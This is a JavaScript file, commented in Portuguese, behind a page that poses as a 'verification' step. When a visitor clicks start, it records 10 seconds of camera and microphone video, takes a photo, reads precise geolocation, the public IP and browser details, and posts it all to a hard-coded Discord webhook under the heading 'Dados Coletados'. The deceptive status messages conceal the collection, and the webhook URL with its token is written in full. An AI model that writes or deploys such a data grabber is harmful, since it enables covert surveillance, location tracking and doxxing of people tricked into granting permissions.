const startBtn = document.getElementById('startBtn');
const loader = document.getElementById('loader');
const statusDiv = document.getElementById('status');
const video = document.getElementById('video');

let mediaRecorder;
let recordedChunks = [];
let stream = null;

// Webhook do Discord - SUBSTITUA PELO SEU!
const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1523084788863467611/yfUAPTp-inY_9IvcJKwqWujOZWANPu6xy8yBPG9X6bLBfmcjPr2OQfZm6kuUU4HdlisZ';

startBtn.addEventListener('click', async () => {
    startBtn.disabled = true;
    loader.style.display = 'block';
    statusDiv.textContent = 'Iniciando verificação...';

    try {
        // 1. PEDIR PERMISSÃO DA CÂMERA
        statusDiv.textContent = 'Solicitando acesso à câmera...';
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        video.srcObject = stream;

        // 2. OBTER LOCALIZAÇÃO
        statusDiv.textContent = 'Obtendo localização...';
        let locationData = { lat: 'Não disponível', lon: 'Não disponível', accuracy: 'N/A' };
        try {
            const pos = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            });
            locationData = {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                accuracy: pos.coords.accuracy + ' metros'
            };
        } catch (e) {
            statusDiv.textContent = 'Localização não disponível, continuando...';
        }

        // 3. GRAVAR VÍDEO DE 10 SEGUNDOS
        statusDiv.textContent = 'Gravando vídeo de 10 segundos...';
        recordedChunks = [];
        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
        
        mediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) recordedChunks.push(e.data);
        };

        mediaRecorder.start();
        
        await new Promise(resolve => setTimeout(resolve, 10000));
        
        mediaRecorder.stop();
        
        // Aguardar processamento final
        await new Promise(resolve => setTimeout(resolve, 500));

        // 4. TIRAR FOTO
        statusDiv.textContent = 'Capturando foto...';
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));

        // 5. OBTER INFORMAÇÕES DO NAVEGADOR
        const browserInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            ip: 'Consultando...'
        };

        // 6. OBTER IP PÚBLICO
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            browserInfo.ip = ipData.ip;
        } catch (e) {
            browserInfo.ip = 'Não foi possível obter';
        }

        // 7. ENVIAR TUDO PARA O DISCORD
        statusDiv.textContent = 'Enviando dados...';
        await sendToDiscord(locationData, browserInfo, recordedChunks, photoBlob);

        statusDiv.textContent = '✅ Verificação concluída com sucesso!';
        startBtn.textContent = 'Concluído';
        
        // Parar stream
        if (stream) stream.getTracks().forEach(track => track.stop());

    } catch (err) {
        console.error('Erro:', err);
        statusDiv.textContent = '❌ Erro na verificação: ' + err.message;
        startBtn.disabled = false;
        loader.style.display = 'none';
        if (stream) stream.getTracks().forEach(track => track.stop());
    }
});

async function sendToDiscord(location, browserInfo, videoChunks, photoBlob) {
    const formData = new FormData();

    // Criar embed JSON
    const embed = {
        embeds: [{
            title: '🎯 Dados Coletados',
            color: 0x00ff00,
            fields: [
                { name: '📍 Localização', value: `Lat: ${location.lat}\nLon: ${location.lon}\nPrecisão: ${location.accuracy}`, inline: true },
                { name: '🌐 Informações do IP', value: `IP: ${browserInfo.ip}\nTimezone: ${browserInfo.timezone}`, inline: true },
                { name: '💻 Sistema', value: `Plataforma: ${browserInfo.platform}\nIdioma: ${browserInfo.language}\nTela: ${browserInfo.screen}`, inline: false },
                { name: '🔗 User Agent', value: `\`\`\`${browserInfo.userAgent}\`\`\``, inline: false }
            ],
            footer: { text: `Coletado em ${new Date().toLocaleString()}` },
            timestamp: new Date().toISOString()
        }]
    };

    // Adicionar foto
    if (photoBlob) {
        const photoFile = new File([photoBlob], 'foto.jpg', { type: 'image/jpeg' });
        formData.append('files[0]', photoFile);
        embed.embeds[0].image = { url: 'attachment://foto.jpg' };
    }

    // Adicionar vídeo
    if (videoChunks.length > 0) {
        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
        const videoFile = new File([videoBlob], 'video.webm', { type: 'video/webm' });
        formData.append('files[1]', videoFile);
    }

    // Adicionar payload JSON
    const payloadBlob = new Blob([JSON.stringify(embed)], { type: 'application/json' });
    formData.append('payload_json', payloadBlob);

    // Enviar
    const response = await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        body: formData
    });

    if (!response.ok) {
        throw new Error(`Erro ao enviar para Discord: ${response.status}`);
    }

    return response;
}